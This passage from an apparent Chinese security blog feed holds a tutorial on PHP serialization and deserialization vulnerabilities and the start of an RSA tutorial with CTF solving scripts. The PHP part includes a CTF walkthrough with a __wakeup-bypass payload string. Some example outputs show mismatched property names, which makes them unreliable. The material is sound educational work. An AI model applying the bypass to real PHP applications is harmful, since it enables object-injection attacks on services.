    <url>/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP反序列化</p> <a id="more"></a><h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br>    print_r(<span class="hljs-variable">$m</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Test <span class="hljs-keyword">Object</span><br>(<br>    [id] =&gt; <span class="hljs-number">1</span><br>    [name] =&gt; admin<br>    [password] =&gt; admins<br>)<br></code></pre></td></tr></table></figure><p>先new一个实例$m，再用<code>serialize()</code>函数将这个对象进行序列化成字符串，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$m</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;roots&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p>函数<code>unserialize</code> ，把serialize序列化后的字符串变成一个对象。可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-variable">$val</span> = serialize(<span class="hljs-variable">$m</span>);<br><span class="hljs-variable">$Nm</span>=unserialize(<span class="hljs-variable">$val</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;name.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;id;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="在这里插入图片描述"><br><a href="https://www.w3cschool.cn/tools/index?name=unserialize">php在线反序列化工具</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h2><p>PHP面向对象变成中，有一类函数叫做魔术函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>__wakeup()</td><td>触发unserialize()方法时会被调用</td></tr><tr><td>__sleep()</td><td>触发serialize()方法时会被调用</td></tr><tr><td>__construct()</td><td>创建一个对象时会被调用</td></tr><tr><td>__destruct()</td><td>销毁一个对象时会被调用</td></tr><tr><td>__get()</td><td>调出不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__set()</td><td>修改或写入不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__toString()</td><td>类对象被当作一个字符串使用时会被调用。</td></tr><tr><td>__isset()</td><td>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</td></tr><tr><td>__unset（）</td><td>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</td></tr><tr><td>__invoke()</td><td>将实例化对象当作方法使用时会被调用。</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="wakeup-和-sleep"><a href="#wakeup-和-sleep" class="headerlink" title="__wakeup()和__sleep()"></a>__wakeup()和__sleep()</h3><blockquote><p>   <strong>PHP __wakeup()函数漏洞</strong><br>   在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep。如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。<br>   这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个__wakeup方法。<br>   如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p></blockquote><p>来一道题</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> xctf();<br><span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p><h2 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2><p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>public序列化后的参数变成 <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00test\00test2&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\00*\00test3&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法详解与练习</title>
    <link href="/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>摘要：做题遇到的一些RSA脚本</p><a id="more"></a><h2 id="1-什么是RSA"><a href="#1-什么是RSA" class="headerlink" title="1. 什么是RSA"></a>1. 什么是RSA</h2><p>1977年，麻省理工学院的 Ron Rivest、Adi Shamir 和 Leonard Adleman 共同提出了一种非对称加密算法，用他们三人的姓氏缩写命名为 RSA。RSA 既不是惟一，也不是最早的非对称加密算法。但它是使用最广泛，因而也是最重要的非对称加密算法。</p><h2 id="2-RSA算法描述"><a href="#2-RSA算法描述" class="headerlink" title="2. RSA算法描述"></a>2. RSA算法描述</h2><h3 id="2-1-产生公私密钥对"><a href="#2-1-产生公私密钥对" class="headerlink" title="2.1 产生公私密钥对"></a>2.1 产生公私密钥对</h3><blockquote><p>1.随机选择两个不相等的质数p和q。<br>2.计算p和q的乘积n(n=p*q),n的长度就是密钥长度。<br>3.计算n的欧拉函数φ(n)： φ(n) = (p-1)(q-1)<br>4.随机选择一个整数e，也就是公钥当中用来加密的那个数字 条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。<br>5.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ)<br>6.将n和e封装成公钥，n和d封装成私钥，（n，e),(n，d)就是密钥对。</p></blockquote><p>补充说明:<br>1.下面代码中使用<code>phi</code>代替欧拉函数φ(n)<br>2.如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。</p><h3 id="2-2-RSA加密"><a href="#2-2-RSA加密" class="headerlink" title="2.2 RSA加密"></a>2.2 RSA加密</h3><p> 首先对明文进行比特串分组，使得每个分组对应的十进制数小于n，然后依次对每个分组m做一次加密，所有分组的密文构成的序列就是原始消息的加密结果，即m满足0&lt;=m&lt;n，则加密算法为：<br> <code>c≡ m^e mod n</code>; c为密文，且0&lt;=c&lt;n。 （还可以表示为c = pow(m, e, N）<br> <img src="https://img-blog.csdnimg.cn/20201004174827178.png#pic_center" alt="在这里插入图片描述"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。只要知道E和N就可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥。即<code>公钥=(E,N)</code></p><h3 id="2-3-RSA解密"><a href="#2-3-RSA解密" class="headerlink" title="2.3 RSA解密"></a>2.3 RSA解密</h3><p>对于密文0&lt;=c&lt;n，解密算法为： <code>m≡ c^d mod n</code>;（还可以表示为m = pow(c, d, N)）</p><p><img src="https://img-blog.csdnimg.cn/20201004113320969.png#pic_center" alt="在这里插入图片描述"><br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。即<code>私钥=(D,N)</code></p><h3 id="2-4-RSA相关值"><a href="#2-4-RSA相关值" class="headerlink" title="2.4 RSA相关值"></a>2.4 RSA相关值</h3><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>p 和 q</td><td>两个不相等的质数</td></tr><tr><td>n</td><td>大整数n，称之为模数</td></tr><tr><td>e 和 d</td><td>互为模反数的两个指数</td></tr><tr><td>c 和 m</td><td>分别是密文和明文</td></tr></tbody></table><h2 id="3-安装gmpy2"><a href="#3-安装gmpy2" class="headerlink" title="3. 安装gmpy2"></a>3. 安装gmpy2</h2><p>检查一下是否安装了wheel文件包，在cmd中输入<code>wheel</code>，查看一下<br><img src="https://img-blog.csdnimg.cn/20201004171147495.png#pic_center" alt="在这里插入图片描述"><br>如果没有安装，则输入<code>pip install wheel</code>安装<br><img src="https://img-blog.csdnimg.cn/20201004171222132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>安装好wheel后，还需要再安装gmpy2所需要的whl文件，查找需要的<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">whl文件包</a>。注意，whl文件包需要和你所安装的python3版本一致；</p><p>输入python查看电脑Python版本所支持的whl文件版本<br><img src="https://img-blog.csdnimg.cn/2020100417135991.png#pic_center" alt="在这里插入图片描述"><br>我使用的是python3.8 32位，下载gmpy2‑2.0.8‑cp38‑cp38‑win32.whl，放到python文件目录下。<br><img src="https://img-blog.csdnimg.cn/20201004172026759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>然后再在cmd中输入：pip install （whl文件的路径）<br><img src="https://img-blog.csdnimg.cn/20201004172409410.png#pic_center" alt="在这里插入图片描述"><br>最后输入：<code>pip install gmpy2</code>就可以安装，没有报错即安装成功<br><img src="https://img-blog.csdnimg.cn/2020100417261163.png#pic_center" alt="在这里插入图片描述"></p><h2 id="4-实战练习"><a href="#4-实战练习" class="headerlink" title="4. 实战练习"></a>4. 实战练习</h2><h3 id="4-1-已知p、q、e，求d"><a href="#4-1-已知p、q、e，求d" class="headerlink" title="4.1 已知p、q、e，求d"></a>4.1 已知p、q、e，求d</h3><p><strong>[BUUCTF]RSA</strong><br><img src="https://img-blog.csdnimg.cn/20201005193350346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">473398607161</span><br>q = <span class="hljs-number">4511491</span><br>e = <span class="hljs-number">17</span><br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>print(d)<br></code></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20201005193500626.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-1-已知p、q、e、密文c，求明文m"><a href="#4-2-1-已知p、q、e、密文c，求明文m" class="headerlink" title="4.2.1 已知p、q、e、密文c，求明文m"></a>4.2.1 已知p、q、e、密文c，求明文m</h3><p><strong>[BUUCTF] rsarsa</strong></p><p>打开文档，给出了p、q、e的值<br><img src="https://img-blog.csdnimg.cn/20200930105157902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><em>方法一</em>：使用RSAtool工具<br>使用rsatool工具计算d的值，直接填入p,q,把e =  65537转换为16进制在再填入，再点击Calc.D,即可获得D的值。<br><img src="https://img-blog.csdnimg.cn/20200930105901703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br>q = <span class="hljs-number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br>C = <span class="hljs-number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br>d = <span class="hljs-number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br>n = p*q<br>flag = <span class="hljs-built_in">pow</span>(C,d,n)<br>print(flag)<br></code></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20200930110203438.png#pic_center" alt="在这里插入图片描述"><br><em>方法二</em>：利用<code>gmpy2</code>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br>q = <span class="hljs-number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br>e = <span class="hljs-number">65537</span><br>C = <span class="hljs-number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="hljs-comment">#1.求d</span><br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-comment">#2.求n</span><br>n = p*q<br><span class="hljs-comment">#3.m=pow(c,d,n)</span><br>flag = <span class="hljs-built_in">pow</span>(C,d,n)<br>print(flag)<br></code></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20201004194955531.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-2-已知c、q、n、e，求明文m"><a href="#4-2-2-已知c、q、n、e，求明文m" class="headerlink" title="4.2.2 